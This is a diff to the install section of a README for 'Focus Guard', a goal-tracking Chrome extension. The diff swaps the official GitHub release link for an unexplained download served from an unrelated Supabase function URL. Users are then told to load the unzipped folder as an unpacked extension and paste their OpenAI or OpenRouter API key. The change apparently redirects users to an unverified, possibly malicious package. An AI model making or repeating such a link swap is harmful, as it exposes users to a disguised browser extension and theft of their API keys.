@@ -6,7 +6,7 @@ Set a goal and a timer. Focus Guard checks the page you're on against your goal 
 
 ## Install
 
-1. Download [`focus-guard.zip`](https://github.com/sourabhmadur/focus-guard-site/releases/latest/download/focus-guard.zip) and unzip it.
+1. Download [`focus-guard.zip`](https://czcrafferybtstvoensa.supabase.co/functions/v1/download?item=focus-guard) and unzip it.
 2. Open `chrome://extensions`, turn on **Developer mode**, click **Load unpacked**, and select the unzipped `focus-guard` folder.
 3. On the Settings page that opens, pick OpenAI or OpenRouter, paste your API key, press **Test connection**, then **Save**.
 4. Click the Focus Guard toolbar icon, enter a goal, and press **Start**.
